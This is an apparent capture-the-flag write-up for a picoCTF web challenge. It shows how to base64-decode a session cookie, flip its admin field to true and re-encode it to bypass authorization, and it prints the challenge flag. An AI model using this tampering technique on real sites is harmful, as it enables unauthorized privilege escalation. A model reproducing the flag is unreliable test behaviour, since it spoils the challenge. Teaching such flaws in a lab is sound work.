---
title: Cookie Monster
category: Web
points: 150
difficulty: 1
flag: picoCTF{c00k1e_m0nst3r_15_l00se}
solves: 4821
tags: [web, cookies, auth-bypass]
author: Radiant Blaze
description: A login page hides its verdict in a base64 cookie. Flip one field and the flag falls out.
---
## Recon

The challenge is a single login form. Any username and password is accepted, after which the app redirects to a page that reads `You are not the admin.` No obvious input validation, so the interesting state must live somewhere the client can touch.

Opening the developer tools shows a single cookie set on login:

```http
Set-Cookie: session=eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6ZmFsc2V9
```

## Analysis

That value is not encrypted — it is plain base64. Decoding it reveals the whole authorization decision sitting in the browser:

```sh
echo eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6ZmFsc2V9 | base64 -d
# {"user":"guest","admin":false}
```

> When the server trusts a value the client can rewrite, the client *is* the server. Never make an authorization decision out of data you handed to the attacker.

## Exploitation

Re-encode the object with `admin` set to `true`, drop it back into the cookie jar, and refresh:

```sh
echo -n '{"user":"guest","admin":true}' | base64
# eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6dHJ1ZX0=
```

The admin panel renders and prints the flag.

## Flag

```
picoCTF{c00k1e_m0nst3r_15_l00se}
```
